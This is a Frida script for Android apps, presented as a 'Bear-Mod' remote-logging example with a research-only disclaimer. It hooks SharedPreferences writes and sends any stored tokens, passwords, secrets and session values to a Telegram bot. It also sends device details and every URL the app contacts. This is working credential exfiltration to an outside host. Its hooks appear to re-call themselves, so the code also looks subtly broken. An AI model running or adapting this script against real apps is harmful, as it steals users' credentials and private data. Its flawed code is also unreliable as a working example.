/**
 * Bear-Mod Telegram Logging Example
 * 
 * This script demonstrates how to use Telegram for remote logging in Bear-Mod.
 * 
 * DISCLAIMER:
 * Bear-Mod is designed for security researchers, app developers, and educational purposes only.
 * Users must:
 * 1. Only analyze applications they own or have explicit permission to test
 * 2. Respect intellectual property rights and terms of service
 * 3. Use findings responsibly through proper disclosure channels
 * 4. Not use this tool to access unauthorized content or services
 */

console.log("[*] Telegram Logging Example Loaded");

// Configuration - REPLACE WITH YOUR OWN VALUES
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";

// Simple function to send a message to Telegram
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
    
    Java.perform(function() {
        try {
            Java.use("java.net.URL").$new(url).openStream().close();
            console.log(`[+] Sent to Telegram: ${message}`);
        } catch (e) {
            console.log(`[-] Failed to send to Telegram: ${e}`);
        }
    });
}

// Check if Telegram configuration is valid
if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" ||
    !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
    console.log("[!] Please set your Telegram bot token and chat ID in the script");
} else {
    // Send initial message
    sendToTelegram("🔍 Bear-Mod Telegram Logging Started");
    
    // Get device information
    Java.perform(function() {
        try {
            const Build = Java.use("android.os.Build");
            const VERSION = Java.use("android.os.Build$VERSION");
            
            let deviceInfo = "📱 Device Information:\n";
            deviceInfo += `- Manufacturer: ${Build.MANUFACTURER.value}\n`;
            deviceInfo += `- Model: ${Build.MODEL.value}\n`;
            deviceInfo += `- Android Version: ${VERSION.RELEASE.value} (API ${VERSION.SDK_INT.value})`;
            
            sendToTelegram(deviceInfo);
            
            // Get application information
            const context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
            const packageName = context.getPackageName();
            const packageManager = context.getPackageManager();
            const packageInfo = packageManager.getPackageInfo(packageName, 0);
            
            let appInfo = "📦 Application Information:\n";
            appInfo += `- Package Name: ${packageName}\n`;
            appInfo += `- Version: ${packageInfo.versionName.value} (${packageInfo.versionCode.value})`;
            
            sendToTelegram(appInfo);
        } catch (e) {
            sendToTelegram(`❌ Error getting device information: ${e}`);
        }
    });
    
    // Hook some interesting methods
    Java.perform(function() {
        try {
            // Hook HTTP URL Connection
            const HttpURLConnection = Java.use("java.net.HttpURLConnection");
            HttpURLConnection.connect.implementation = function() {
                try {
                    const url = this.getURL().toString();
                    sendToTelegram(`🌐 HTTP Connection: ${url}`);
                } catch (e) {
                    // Ignore errors
                }
                return this.connect();
            };
            
            // Hook SharedPreferences
            const SharedPreferencesEditor = Java.use("android.content.SharedPreferences$Editor");
            SharedPreferencesEditor.putString.implementation = function(key, value) {
                if (key && value && typeof key === 'string' && typeof value === 'string') {
                    // Only log potentially interesting keys
                    const interestingKeys = ["token", "key", "secret", "password", "auth", "credential", "session"];
                    if (interestingKeys.some(k => key.toLowerCase().includes(k))) {
                        sendToTelegram(`🔑 SharedPreferences: ${key} = ${value}`);
                    }
                }
                return this.putString(key, value);
            };
            
            console.log("[+] Hooks installed");
        } catch (e) {
            console.log(`[-] Error installing hooks: ${e}`);
        }
    });
    
    // Send a message every 30 seconds
    const intervalId = setInterval(function() {
        sendToTelegram(`⏱️ Still monitoring at ${new Date().toISOString()}`);
    }, 30000);
    
    // Stop after 5 minutes
    setTimeout(function() {
        clearInterval(intervalId);
        sendToTelegram("🛑 Bear-Mod Telegram Logging Stopped");
    }, 5 * 60 * 1000);
}

// Cleanup function
function cleanup() {
    if (typeof intervalId !== 'undefined') {
        clearInterval(intervalId);
        sendToTelegram("🛑 Bear-Mod Telegram Logging Stopped (cleanup)");
    }
}

// Export cleanup function
module.exports = {
    cleanup: cleanup
};
